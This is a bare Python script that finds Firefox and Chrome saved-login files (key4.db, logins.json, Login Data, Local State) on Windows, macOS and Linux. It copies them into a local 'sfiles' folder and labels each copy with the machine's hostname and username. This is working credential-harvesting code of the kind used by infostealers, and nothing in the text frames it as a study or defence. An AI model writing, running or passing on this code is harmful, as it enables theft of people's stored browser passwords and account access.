import getpass
import os
import re
import shutil
import socket
import sys


def dl_browsers_secrets():
    db_path = sfiles_dir_exist()
    firefox_path = get_firefox_path()
    chrome_path = get_chrome_path()
    if firefox_path != '':
        for file in find_files_by_pattern(firefox_path, r"(key4\.db|logins\.json)"):
            shutil.copy(file[0],
                        os.path.join(db_path, socket.gethostname() + '_' + getpass.getuser() + '_firefox_' + file[
                            1].replace(' ', '-')))
    if chrome_path != '':
        for file in find_files_by_pattern(chrome_path, r"(Login Data|Local State)$"):
            shutil.copy(file[0],
                        os.path.join(db_path, socket.gethostname() + '_' + getpass.getuser() + '_chrome_' + file[
                            1].replace(' ', '-')))


def sfiles_dir_exist():
    db_path = os.path.join('.', 'sfiles')
    if not os.path.isdir(db_path):
        os.makedirs(db_path)
    return db_path


def find_files_by_pattern(directory, pattern):
    for root, dirs, files in os.walk(directory):
        for basename in files:
            if re.search(pattern, basename):
                filename = os.path.join(root, basename)
                yield filename, re.search(pattern, basename).string


def get_chrome_path():
    path_name = ""
    if os.name == "nt":
        # This is the Windows Path
        path_name = os.getenv('localappdata') + \
                    '\\Google\\Chrome\\User Data\\'
    elif os.name == "posix":
        path_name = os.getenv('HOME')
        if sys.platform == "darwin":
            # This is the OS X Path
            path_name += '/Library/Application Support/Google/Chrome/'
        else:
            # This is the Linux Path
            path_name += '/.config/google-chrome/'
    if not os.path.isdir(path_name):
        print('[!] Chrome Doesn\'t exists')

    return path_name


def get_firefox_path():
    path_name = ""
    if os.name == "nt":
        # This is the Windows Path
        path_name = os.getenv('appdata') + \
                    '\\Mozilla\\Firefox\\Profiles\\'
    elif os.name == "posix":
        path_name = os.getenv('HOME')
        if sys.platform == "darwin":
            # This is the OS X Path
            path_name += '/Library/Application Support/Mozilla/Firefox/Profile/'
        else:
            # This is the Linux Path
            path_name += '/.mozilla/firefox'
    if not os.path.isdir(path_name):
        print('[!] Firefox Doesn\'t exists')

    return path_name
